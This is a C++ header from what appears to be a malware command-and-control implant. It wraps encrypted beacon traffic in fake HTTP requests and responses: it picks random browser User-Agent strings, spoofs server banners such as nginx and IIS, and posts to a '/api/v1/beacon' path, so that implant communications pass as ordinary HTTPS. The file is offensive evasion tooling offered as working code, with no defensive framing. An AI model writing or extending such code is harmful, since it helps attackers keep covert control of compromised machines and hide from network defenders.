// HTTP mimicry framing over TLS (header-only) - beacon traffic looks like
// ordinary HTTPS web traffic. Tokens are randomized per request.
#pragma once
#include "kx.h"
#include <string>
#include <cstdlib>

static bool http_send_all(SecureChannel& t, const std::string& data) {
    return t.send_all(data.data(), data.size());
}

static const char* http_pick_ua() {
    static const char* uas[] = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
    };
    return uas[rand() % 3];
}

static bool http_read_body(SecureChannel& t, std::string& body) {
    std::string hdr;
    while (hdr.find("\r\n\r\n") == std::string::npos) {
        char tmp[1024];
        int n = t.recv(tmp, sizeof(tmp));
        if (n <= 0) return false;
        hdr.append(tmp, n);
        if (hdr.size() > (1 << 16)) return false;
    }

    size_t pos = hdr.find("Content-Length:");
    if (pos == std::string::npos) return false;
    pos += 15;
    while (hdr[pos] == ' ') pos++;
    size_t end = hdr.find("\r\n", pos);
    int len = atoi(hdr.substr(pos, end - pos).c_str());
    if (len < 0 || len > (1 << 22)) return false;

    size_t body_start = hdr.find("\r\n\r\n") + 4;
    body = hdr.substr(body_start);
    while ((int)body.size() < len) {
        char tmp[2048];
        int n = t.recv(tmp, sizeof(tmp));
        if (n <= 0) return false;
        body.append(tmp, n);
    }
    body.resize(len);
    return true;
}

static bool http_send_request(SecureChannel& t, const std::string& body, const std::string& host) {
    std::string req = "POST /api/v1/beacon HTTP/1.1\r\n";
    req += "Host: " + host + "\r\n";
    req += "User-Agent: ";
    req += http_pick_ua();
    req += "\r\n";
    req += "Content-Type: application/octet-stream\r\n";
    req += "Accept: */*\r\n";
    req += "Accept-Language: en-US,en;q=0.9\r\n";
    req += "Cache-Control: no-cache\r\n";
    req += "Content-Length: " + std::to_string(body.size()) + "\r\n";
    req += "Connection: keep-alive\r\n\r\n";
    req += body;
    return http_send_all(t, req);
}

static bool http_send_response(SecureChannel& t, const std::string& body) {
    static const char* servers[] = { "nginx/1.24.0", "Microsoft-IIS/10.0", "cloudflare" };
    std::string resp = "HTTP/1.1 200 OK\r\n";
    resp += "Server: ";
    resp += servers[rand() % 3];
    resp += "\r\n";
    resp += "Content-Type: application/octet-stream\r\n";
    resp += "Content-Length: " + std::to_string(body.size()) + "\r\n";
    resp += "Connection: keep-alive\r\n\r\n";
    resp += body;
    return http_send_all(t, resp);
}
